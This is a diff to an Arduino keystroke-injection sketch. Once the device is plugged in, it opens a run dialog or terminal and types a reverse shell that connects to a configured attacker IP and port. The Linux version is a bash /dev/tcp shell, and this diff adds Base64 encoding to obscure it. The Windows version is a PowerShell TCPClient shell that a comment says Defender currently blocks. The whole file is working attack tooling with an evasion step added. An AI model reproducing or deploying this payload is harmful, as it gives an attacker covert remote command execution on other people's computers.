@@ -19,11 +19,12 @@
 
   Author: NenshaM
   License: GPL v3
-  Version: 1.0.0
+  Version: 1.1.0
   ============================================================
 */
 
 #include <Keyboard.h>
+#include <Base64.h>
 
 // ================= USER CONFIGURATION =================
 
@@ -38,7 +39,7 @@ const bool DEBUG_MODE = true;
 
 
 // ================= LINUX COMMANDS =================
-#ifndef OS_LINUX
+#ifdef OS_LINUX
 
 // Key combo to open GNOME run dialog
 const int OPEN_RUN_KEYS[] = {
@@ -50,12 +51,35 @@ const int OPEN_RUN_KEYS[] = {
 const char TERMINAL_CMD[] = "gnome-terminal";
 
 // BASH reverse shell payload
-const char PAYLOAD[] = "nohup bash -c 'bash -i >& /dev/tcp/" IP_ADDR "/" PORT_NUM " 0>&1 &'; exit";
+char* create_payload(void) {
+  char clearPayload[] = "bash -i >& /dev/tcp/" IP_ADDR "/" PORT_NUM " 0>&1 &";
+
+  int clearPayloadLength = strlen(clearPayload);
+  int encodedLength = Base64.encodedLength(clearPayloadLength);
+  int payloadLength = strlen("nohup bash -c \"$(echo '") + encodedLength + strlen("' | base64 --decode)\"; exit") + 1;
+
+  // Dynamically allocate memory for the encoded string + "| base64 --decode"
+  char* payload = new char[payloadLength];
+  strcpy(payload, "nohup bash -c \"$(echo '");
+
+  // Encode the input string
+  Base64.encode(payload + strlen("nohup bash -c \"$(echo '"), clearPayload, clearPayloadLength);
+
+  // Append "| base64 --decode" to the encoded string
+  strcat(payload, "' | base64 --decode)\"; exit");
+
+  if (DEBUG_MODE) {
+    Serial.print("Payload: ");
+    Serial.println(payload);
+  }
+
+  return payload;
+}
 
 #endif
 
 // ================= WINDOS COMMANDS =================
-#ifndef OS_WINDOWS
+#ifdef OS_WINDOWS
 
 // Key combo to open run dialog
 const int OPEN_RUN_KEYS[] = {
@@ -67,9 +91,19 @@ const int OPEN_RUN_KEYS[] = {
 const char TERMINAL_CMD[] = "powershell";
 
 // Powershell reverse shell payload !!! Currently blocked by defender
-const char PAYLOAD[] = "$client = New-Object System.Net.Sockets.TCPClient('" IP_ADDR "'," PORT_NUM 
-");$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()";
+char* create_payload(void) {
+  char clearPayload[] = "$client = New-Object System.Net.Sockets.TCPClient('" IP_ADDR "'," PORT_NUM
+   ");$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()";
 
+  int clearPayloadLength = strlen(clearPayload);
+  // int encodedLength = Base64.encodedLength(clearPayloadLength);
+
+  // Dynamically allocate memory for the encoded string + "| base64 --decode"
+  char* payload = new char[clearPayloadLength+1];
+  strcpy(payload, clearPayload);
+
+  return payload;
+}
 #endif
 
 // ================= HELPER FUNCTIONS =================
@@ -134,7 +168,7 @@ void setup() {
 
   // Execute reverse shell payload
   delay(random(750, 1250));
-  typeCommand(PAYLOAD);
+  typeCommand(create_payload());
 
   Keyboard.end();
 }
